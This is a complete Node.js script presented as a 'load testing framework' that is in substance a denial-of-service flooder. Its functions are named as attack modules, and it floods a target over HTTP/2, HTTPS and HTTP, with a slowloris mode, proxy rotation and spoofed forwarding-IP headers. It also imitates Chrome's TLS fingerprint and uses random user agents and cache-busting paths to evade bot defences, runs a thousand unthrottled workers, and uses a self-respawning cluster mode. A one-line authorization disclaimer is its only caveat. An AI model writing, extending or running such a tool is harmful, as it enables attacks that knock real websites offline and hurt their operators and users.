#!/usr/bin/env node

/**
 * TOBI v8.0 – Ultimate Load Testing Framework
 * Features: HTTP/2, TLS fingerprint, proxy rotation, slowloris, random headers, cluster mode, RAM monitor
 * No external dependencies (uses Node.js built-ins only)
 * Authorized target only – written authorization required
 */

const fs = require('fs');
const net = require('net');
const tls = require('tls');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');
const readline = require('readline');
const events = require('events');
const zlib = require('zlib');

// Increase event listeners limit
events.EventEmitter.defaultMaxListeners = 0;

// ==================== COLORS ====================
const c = {
    red: '\x1b[91m', green: '\x1b[92m', yellow: '\x1b[93m',
    blue: '\x1b[94m', magenta: '\x1b[95m', cyan: '\x1b[96m',
    white: '\x1b[97m', bold: '\x1b[1m', dim: '\x1b[2m',
    reset: '\x1b[0m', clear: '\x1b[2J\x1b[H'
};

// ==================== CONFIGURATION ====================
let CONFIG = {
    target: null,
    duration: 60,
    workers: 1000,
    rate: 0,
    proxyFile: null,
    mode: 'mixed',
    timeout: 10000,
    ipSpoof: true,
    followRedirect: false,
    clusterMode: false,
    ramLimit: 85,
    restartDelay: 1000
};

// Parse command line arguments
if (process.argv.length >= 3) {
    CONFIG.target = process.argv[2];
    CONFIG.duration = parseInt(process.argv[3]) || 60;
    CONFIG.workers = parseInt(process.argv[4]) || 1000;
    CONFIG.rate = parseInt(process.argv[5]) || 0;
    CONFIG.proxyFile = process.argv[6] || null;
    CONFIG.mode = process.argv[7] || 'mixed';
    if (process.argv.includes('--cluster')) CONFIG.clusterMode = true;
}

// ==================== PROXY MANAGER ====================
let proxies = [];
let proxyIndex = 0;
let workingProxies = [];

function loadProxies() {
    if (!CONFIG.proxyFile) return;
    try {
        const content = fs.readFileSync(CONFIG.proxyFile, 'utf8');
        proxies = content.split('\n').filter(l => {
            l = l.trim();
            return l && !l.startsWith('#') && l.includes(':');
        });
        console.log(`${c.green}[✓] Loaded ${proxies.length} proxies${c.reset}`);
        validateProxies();
    } catch(e) {
        console.log(`${c.yellow}[!] No proxy file – running without proxies${c.reset}`);
    }
}

async function validateProxies() {
    const valid = [];
    for (const proxy of proxies.slice(0, 50)) {
        try {
            await new Promise((resolve) => {
                const [host, port] = proxy.split(':');
                const socket = net.connect(parseInt(port), host, () => {
                    socket.destroy();
                    valid.push(proxy);
                    resolve();
                });
                socket.setTimeout(3000, () => { socket.destroy(); resolve(); });
                socket.on('error', () => resolve());
            });
        } catch(e) {}
    }
    workingProxies = valid;
    console.log(`${c.green}[✓] ${workingProxies.length} proxies are responsive${c.reset}`);
}

function getProxy() {
    if (workingProxies.length) {
        proxyIndex = (proxyIndex + 1) % workingProxies.length;
        return workingProxies[proxyIndex];
    }
    if (proxies.length) {
        proxyIndex = (proxyIndex + 1) % proxies.length;
        return proxies[proxyIndex];
    }
    return null;
}

// ==================== TLS FINGERPRINT (Chrome 122) ====================
const TLS_CIPHERS = [
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_128_GCM_SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384'
].join(':');

const TLS_OPTIONS = {
    ciphers: TLS_CIPHERS,
    ecdhCurve: 'X25519',
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    honorCipherOrder: true,
    rejectUnauthorized: false,
    ALPNProtocols: ['h2', 'http/1.1']
};

// ==================== HEADER & PATH GENERATORS ====================
function randomString(len) {
    return crypto.randomBytes(len).toString('hex');
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function spoofIP() {
    return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,254)}`;
}

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1'
];

const ACCEPT_HEADERS = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'application/json, text/plain, */*'
];

const ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9',
    'es-ES,es;q=0.9', 'ja-JP,ja;q=0.9', 'zh-CN,zh;q=0.9'
];

const REFERERS = [
    'https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/',
    'https://github.com/', 'https://stackoverflow.com/', 'https://www.reddit.com/',
    'https://www.youtube.com/', 'https://www.facebook.com/'
];

function generatePath() {
    const paths = [
        `/${randomString(8)}`,
        `/api/v${randomInt(1,5)}/${randomString(10)}`,
        `/static/${randomString(6)}`,
        `/content/${randomInt(1000,99999)}`,
        `/search?q=${randomString(12)}`,
        `/page/${randomInt(1,5000)}?ref=${Math.random() > 0.5 ? 'home' : 'search'}`,
        `/user/${randomInt(10000,99999)}/profile`,
        `/product/${randomInt(1000,9999)}/details`,
        `/blog/post/${randomInt(1,50000)}`
    ];
    let path = paths[Math.floor(Math.random() * paths.length)];
    if (Math.random() > 0.5) {
        path += (path.includes('?') ? '&' : '?') + `_t=${Date.now()}&_r=${randomString(6)}`;
    }
    return path;
}

function generateHeaders(host, isHttp2 = false) {
    const headers = {
        'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
        'Accept': ACCEPT_HEADERS[Math.floor(Math.random() * ACCEPT_HEADERS.length)],
        'Accept-Language': ACCEPT_LANGUAGES[Math.floor(Math.random() * ACCEPT_LANGUAGES.length)],
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'DNT': randomInt(0,1).toString(),
        'Upgrade-Insecure-Requests': '1'
    };
    if (CONFIG.ipSpoof) {
        headers['X-Forwarded-For'] = spoofIP();
        headers['X-Real-IP'] = spoofIP();
    }
    if (Math.random() > 0.3) {
        headers['Referer'] = REFERERS[Math.floor(Math.random() * REFERERS.length)] + host;
    }
    if (Math.random() > 0.6) {
        headers['Cookie'] = `session=${randomString(16)}; _ga=GA1.2.${randomInt(1000000,9999999)}.${Math.floor(Date.now()/1000)}`;
    }
    if (isHttp2) {
        headers[':method'] = 'GET';
        headers[':path'] = generatePath();
        headers[':scheme'] = 'https';
        headers[':authority'] = host;
    }
    return headers;
}

// ==================== ATTACK MODULES (with URL fix) ====================

// 1. HTTP/2
function attackHttp2(targetUrl, callback) {
    // Ensure URL has protocol
    if (!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;
    const parsed = new URL(targetUrl);
    const proxy = getProxy();
    let socket;
    const start = Date.now();
    
    const createSession = (tlsSocket) => {
        const session = http2.connect(parsed.hostname, {
            createConnection: () => tlsSocket,
            ...TLS_OPTIONS
        });
        session.on('error', () => callback(false, null, Date.now() - start));
        const headers = generateHeaders(parsed.hostname, true);
        const req = session.request(headers);
        req.on('response', (responseHeaders) => {
            const status = responseHeaders[':status'];
            req.on('data', () => {});
            req.on('end', () => {
                session.close();
                callback(status >= 200 && status < 400, status, Date.now() - start);
            });
        });
        req.on('error', () => {
            session.close();
            callback(false, null, Date.now() - start);
        });
        req.end();
    };
    
    if (proxy) {
        const [proxyHost, proxyPort] = proxy.split(':');
        socket = net.connect(parseInt(proxyPort), proxyHost, () => {
            const tlsSocket = tls.connect({
                host: parsed.hostname,
                port: 443,
                socket: socket,
                ...TLS_OPTIONS,
                servername: parsed.hostname
            }, () => createSession(tlsSocket));
            tlsSocket.on('error', () => callback(false, null, Date.now() - start));
        });
        socket.on('error', () => callback(false, null, Date.now() - start));
    } else {
        const tlsSocket = tls.connect({
            host: parsed.hostname,
            port: 443,
            ...TLS_OPTIONS,
            servername: parsed.hostname
        }, () => createSession(tlsSocket));
        tlsSocket.on('error', () => callback(false, null, Date.now() - start));
    }
}

// 2. HTTPS
function attackHttps(targetUrl, callback) {
    if (!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;
    const parsed = new URL(targetUrl);
    const path = generatePath();
    const headers = generateHeaders(parsed.hostname, false);
    const start = Date.now();
    const proxy = getProxy();
    
    const options = {
        hostname: parsed.hostname,
        port: 443,
        path: path,
        method: 'GET',
        headers: headers,
        timeout: CONFIG.timeout,
        rejectUnauthorized: false
    };
    if (proxy) {
        const [proxyHost, proxyPort] = proxy.split(':');
        options.agent = new https.Agent({ proxy: { host: proxyHost, port: parseInt(proxyPort) } });
    }
    const req = https.request(options, (res) => {
        res.on('data', () => {});
        res.on('end', () => {
            callback(res.statusCode >= 200 && res.statusCode < 400, res.statusCode, Date.now() - start);
        });
    });
    req.on('error', () => callback(false, null, Date.now() - start));
    req.on('timeout', () => {
        req.destroy();
        callback(false, null, CONFIG.timeout);
    });
    req.end();
}

// 3. Slowloris
function slowloris(targetUrl, callback) {
    if (!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;
    const parsed = new URL(targetUrl);
    const headers = generateHeaders(parsed.hostname, false);
    headers['Connection'] = 'keep-alive';
    const options = {
        hostname: parsed.hostname,
        port: 443,
        method: 'GET',
        headers: headers,
        rejectUnauthorized: false,
        timeout: 30000
    };
    const req = https.request(options);
    req.on('error', () => callback(false, null, 0));
    req.setTimeout(30000, () => {});
    req.write(`GET ${generatePath()} HTTP/1.1\r\n`);
    setTimeout(() => {
        req.write(`Host: ${parsed.hostname}\r\n`);
        setTimeout(() => {
            req.write(`User-Agent: ${USER_AGENTS[0]}\r\n`);
            setTimeout(() => {
                req.end();
                callback(true, 200, 0);
            }, 1000);
        }, 1000);
    }, 1000);
}

// 4. HTTP
function attackHttp(targetUrl, callback) {
    if (!targetUrl.startsWith('http')) targetUrl = 'http://' + targetUrl;
    const parsed = new URL(targetUrl);
    const path = generatePath();
    const headers = generateHeaders(parsed.hostname, false);
    const start = Date.now();
    const proxy = getProxy();
    
    const options = {
        hostname: parsed.hostname,
        port: parsed.port || 80,
        path: path,
        method: 'GET',
        headers: headers,
        timeout: CONFIG.timeout,
        rejectUnauthorized: false
    };
    if (proxy) {
        const [proxyHost, proxyPort] = proxy.split(':');
        options.agent = new http.Agent({ proxy: { host: proxyHost, port: parseInt(proxyPort) } });
    }
    const req = http.request(options, (res) => {
        res.on('data', () => {});
        res.on('end', () => {
            callback(res.statusCode >= 200 && res.statusCode < 400, res.statusCode, Date.now() - start);
        });
    });
    req.on('error', () => callback(false, null, Date.now() - start));
    req.on('timeout', () => {
        req.destroy();
        callback(false, null, CONFIG.timeout);
    });
    req.end();
}

// ==================== WORKER ====================
let stats = {
    total: 0, success: 0, failed: 0,
    startTime: null, lastSec: 0, lastSecCount: 0, peakRps: 0,
    codes: {}, errors: {}
};
let stopAttack = false;

function record(success, code, time) {
    stats.total++;
    if (success) stats.success++;
    else stats.failed++;
    if (code) stats.codes[code] = (stats.codes[code] || 0) + 1;
    const now = Date.now() / 1000;
    if (now - stats.lastSec >= 1) {
        if (stats.lastSecCount > stats.peakRps) stats.peakRps = stats.lastSecCount;
        stats.lastSecCount = 0;
        stats.lastSec = now;
    }
    stats.lastSecCount++;
}

function worker(targetUrl) {
    if (stopAttack) return;
    let attackFunc;
    switch (CONFIG.mode) {
        case 'http2': attackFunc = attackHttp2; break;
        case 'https': attackFunc = attackHttps; break;
        case 'slowloris': attackFunc = slowloris; break;
        case 'http': attackFunc = attackHttp; break;
        default: attackFunc = Math.random() > 0.7 ? attackHttp2 : attackHttps;
    }
    attackFunc(targetUrl, (success, code, time) => {
        record(success, code, time);
        if (!stopAttack) worker(targetUrl);
    });
}

// ==================== STATISTICS DISPLAY ====================
function displayStats() {
    const elapsed = (Date.now() - stats.startTime) / 1000;
    const rps = stats.total / Math.max(elapsed, 0.1);
    const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
    const mem = Math.round(process.memoryUsage().rss / 1024 / 1024);
    process.stdout.write(`\r${c.cyan}RPS: ${c.bold}${rps.toFixed(1)}${c.reset} | ` +
        `${c.green}✓ ${stats.success.toLocaleString()}${c.reset} | ` +
        `${c.red}✗ ${stats.failed.toLocaleString()}${c.reset} | ` +
        `${c.yellow}${successRate.toFixed(1)}%${c.reset} | ` +
        `${c.magenta}${mem}MB${c.reset} | ` +
        `${c.dim}${elapsed.toFixed(0)}s${c.reset}`);
}

// ==================== RAM MONITOR ====================
function monitorRam() {
    const used = process.memoryUsage().rss / 1024 / 1024;
    const total = os.totalmem() / 1024 / 1024;
    const percent = (used / total) * 100;
    if (percent > CONFIG.ramLimit) {
        console.log(`\n${c.red}[!] RAM usage ${percent.toFixed(1)}% – restarting...${c.reset}`);
        process.exit(1);
    }
}

// ==================== BANNER ====================
function showBanner() {
    console.log(c.clear);
    console.log(`${c.red}${c.bold}
╔══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                      ║
║   ████████╗ ██████╗ ██████╗ ██╗    ██╗   ██╗    ██████╗   ██████╗                    ║
║   ╚══██╔══╝██╔═══██╗██╔══██╗██║    ██║   ██║    ██╔══██╗ ██╔═══██╗                   ║
║      ██║   ██║   ██║██████╔╝██║    ██║   ██║    ██████╔╝ ██║   ██║                   ║
║      ██║   ██║   ██║██╔══██╗██║    ██║   ██║    ██╔══██╗ ██║   ██║                   ║
║      ██║   ╚██████╔╝██████╔╝██║    ╚██████╔╝    ██████╔╝ ╚██████╔╝                   ║
║      ╚═╝    ╚═════╝ ╚═════╝ ╚═╝     ╚═════╝     ╚═════╝   ╚═════╝                    ║
║                                                                                      ║
║                    ${c.cyan}🔥 TOBI v8.0 – ULTIMATE EDITION 🔥${c.red}                              ║
║          HTTP/2 | TLS Fingerprint | Proxy Rotation | Slowloris | Cluster            ║
╚══════════════════════════════════════════════════════════════════════════════════════╝${c.reset}`);
}

// ==================== MAIN ====================
async function main() {
    showBanner();
    
    let target = CONFIG.target;
    let duration = CONFIG.duration;
    let workers = CONFIG.workers;
    let rate = CONFIG.rate;
    
    if (!target) {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        target = await new Promise(resolve => rl.question(`${c.cyan}🌐 Target URL: ${c.reset}`, resolve));
        duration = parseInt(await new Promise(resolve => rl.question(`${c.cyan}⏱️  Duration (seconds): ${c.reset}`, resolve))) || 60;
        workers = parseInt(await new Promise(resolve => rl.question(`${c.cyan}👥 Workers: ${c.reset}`, resolve))) || 1000;
        rate = parseInt(await new Promise(resolve => rl.question(`${c.cyan}🚦 Rate/worker (0=unlimited): ${c.reset}`, resolve))) || 0;
        const useProxy = await new Promise(resolve => rl.question(`${c.cyan}🔄 Use proxy file? (y/n): ${c.reset}`, resolve));
        if (useProxy.toLowerCase() === 'y') {
            CONFIG.proxyFile = await new Promise(resolve => rl.question(`${c.cyan}📁 Proxy file path: ${c.reset}`, resolve)) || 'proxy.txt';
        }
        const modeOpt = await new Promise(resolve => rl.question(`${c.cyan}⚙️  Attack mode (http2/https/http/slowloris/mixed): ${c.reset}`, resolve));
        if (['http2','https','http','slowloris','mixed'].includes(modeOpt.toLowerCase())) CONFIG.mode = modeOpt.toLowerCase();
        rl.close();
        CONFIG.target = target;
        CONFIG.duration = duration;
        CONFIG.workers = workers;
        CONFIG.rate = rate;
    }
    
    if (!target.startsWith('http')) target = 'https://' + target;
    CONFIG.target = target;
    
    console.log(`\n${c.green}[✓] Target: ${target}`);
    console.log(`[✓] Duration: ${duration}s`);
    console.log(`[✓] Workers: ${workers.toLocaleString()}`);
    console.log(`[✓] Rate/worker: ${rate === 0 ? 'UNLIMITED' : rate}`);
    console.log(`[✓] Attack mode: ${CONFIG.mode}`);
    if (CONFIG.proxyFile) loadProxies();
    console.log(`${c.reset}\n`);
    
    stats.startTime = Date.now();
    stats.lastSec = stats.startTime / 1000;
    
    console.log(`${c.yellow}[!] Launching ${workers} workers...${c.reset}`);
    for (let i = 0; i < workers; i++) {
        worker(target);
        if (i % 1000 === 0 && i > 0) await new Promise(r => setTimeout(r, 1));
    }
    console.log(`${c.green}[✓] All workers launched!${c.reset}\n`);
    
    const statsInterval = setInterval(displayStats, 1000);
    const ramInterval = setInterval(monitorRam, 5000);
    
    process.on('SIGINT', () => {
        console.log(`\n${c.yellow}[!] Shutting down...${c.reset}`);
        stopAttack = true;
        setTimeout(() => {
            clearInterval(statsInterval);
            clearInterval(ramInterval);
            const elapsed = (Date.now() - stats.startTime) / 1000;
            const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
            console.log(`\n${c.magenta}${c.bold}════════════════════════════════════════════════════════════════════════`);
            console.log(`                         FINAL REPORT`);
            console.log(`════════════════════════════════════════════════════════════════════════${c.reset}`);
            console.log(`  Total Requests:  ${stats.total.toLocaleString()}`);
            console.log(`  Successful:      ${stats.success.toLocaleString()}`);
            console.log(`  Failed:          ${stats.failed.toLocaleString()}`);
            console.log(`  Success Rate:    ${successRate.toFixed(2)}%`);
            console.log(`  Peak RPS:        ${stats.peakRps}`);
            console.log(`  Duration:        ${elapsed.toFixed(1)}s`);
            if (Object.keys(stats.codes).length) {
                console.log(`\n  Status Codes:`);
                for (const [code, count] of Object.entries(stats.codes)) {
                    console.log(`    ${code}: ${count.toLocaleString()}`);
                }
            }
            console.log(`${c.magenta}════════════════════════════════════════════════════════════════════════${c.reset}\n`);
            process.exit(0);
        }, 1000);
    });
    
    setTimeout(() => {
        stopAttack = true;
    }, duration * 1000);
}

// ==================== CLUSTER MODE ====================
if (cluster.isMaster && CONFIG.clusterMode) {
    const numCPUs = os.cpus().length;
    console.log(`${c.green}[✓] Master ${process.pid} starting ${numCPUs} workers${c.reset}`);
    for (let i = 0; i < numCPUs; i++) cluster.fork();
    cluster.on('exit', (worker) => {
        console.log(`${c.yellow}[!] Worker ${worker.process.pid} died, restarting...${c.reset}`);
        cluster.fork();
    });
} else {
    main().catch(err => {
        console.error(`${c.red}Fatal: ${err.message}${c.reset}`);
        process.exit(1);
    });
}
